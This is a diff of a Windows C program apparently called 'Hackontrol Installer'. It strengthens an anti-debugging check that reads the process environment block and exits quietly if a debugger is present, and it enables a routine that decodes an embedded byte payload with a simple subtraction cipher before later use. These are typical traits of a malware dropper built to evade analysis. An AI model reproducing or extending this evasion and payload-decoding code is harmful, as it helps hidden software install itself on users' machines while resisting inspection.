@@ -48,14 +48,21 @@ static void displayError(const LPCWSTR function, const DWORD code, const HANDLE 
 int main(int argc, char** argv) {
 	PPEB block = (PPEB) __readgsqword(0x60);
 
-	if(block && block->BeingDebugged) {
+	if(!block || block->BeingDebugged) {
 		return 0;
 	}
 
 	HANDLE heap = GetProcessHeap();
 
 	if(!heap) {
-		MessageBoxW(NULL, L"Error: Cannot get the process heap", L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+		MessageBoxW(NULL, L"Error: No process heap available", L"Hackontrol Installer Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+		return 1;
+	}
+
+	DWORD length = ExpandEnvironmentStringsW(PATH, NULL, 0);
+
+	if(!length) {
+		displayError(L"ExpandEnvironmentStringsW", GetLastError(), heap);
 		return 1;
 	}
 
@@ -89,15 +96,7 @@ int main(int argc, char** argv) {
 		return 1;
 	}
 
-	DWORD length = ExpandEnvironmentStringsW(PATH, NULL, 0);
-
-	if(!length) {
-		displayError(L"ExpandEnvironmentStringsW", GetLastError(), heap);
-		return 1;
-	}
-
-	printf("Length: %lu\n", length);
-	LPWSTR pathHome = HeapAlloc(heap, 0, length * sizeof(WCHAR));
+	LPWSTR pathHome = HeapAlloc(heap, 0, sizeof(WCHAR) * length);
 
 	if(!pathHome) {
 		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
@@ -110,13 +109,11 @@ int main(int argc, char** argv) {
 		return 1;
 	}
 
-	printf("Path: %ws\n", pathHome);
-	HeapFree(heap, 0, pathHome);
-
-	/*PBYTE buffer = HeapAlloc(heap, 0, size);
+	PBYTE buffer = HeapAlloc(heap, 0, size);
 
 	if(!buffer) {
 		displayError(L"HeapAlloc", ERROR_FUNCTION_FAILED, heap);
+		HeapFree(heap, 0, pathHome);
 		return 1;
 	}
 
@@ -126,7 +123,8 @@ int main(int argc, char** argv) {
 		buffer[value] = (data[value] - 18) % 0xFF;
 	}
 
-	HeapFree(heap, 0, buffer);*/
+	HeapFree(heap, 0, buffer);
+	HeapFree(heap, 0, pathHome);
 	printf("Finished\n");
 	return 0;
 }
